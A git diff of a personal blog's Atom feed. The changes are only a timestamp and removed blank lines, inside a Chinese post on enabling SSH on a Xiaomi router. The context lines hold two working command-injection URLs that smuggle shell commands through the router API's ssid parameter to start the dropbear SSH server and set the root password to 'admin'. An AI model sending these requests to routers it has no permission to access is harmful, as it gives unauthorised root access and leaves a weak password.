@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://akaliashe.github.io</id>
     <title>幻樱杀缭乱</title>
-    <updated>2021-06-05T15:10:28.619Z</updated>
+    <updated>2021-06-05T15:13:08.370Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://akaliashe.github.io"/>
     <link rel="self" href="https://akaliashe.github.io/atom.xml"/>
@@ -36,14 +36,10 @@
 <p>登陆小米路由器后台后，浏览器地址栏 stok= 后面的一段内容即是（选中部分），准备好备用。</p>
 <h3 id="获取-ssh">获取 SSH</h3>
 <pre><code>http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
-
-
 </code></pre>
 <p>将 <STOK> 替换为上一步的值，替换完成后复制到浏览器打开。</p>
 <h3 id="修改默认-ssh-密码为-admin">修改默认 SSH 密码为 admin</h3>
 <pre><code>http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
-
-
 </code></pre>
 <p>将 <STOK> 替换为上上一步的值，替换完成后复制到浏览器打开。</p>
 <h3 id="备份">备份</h3>
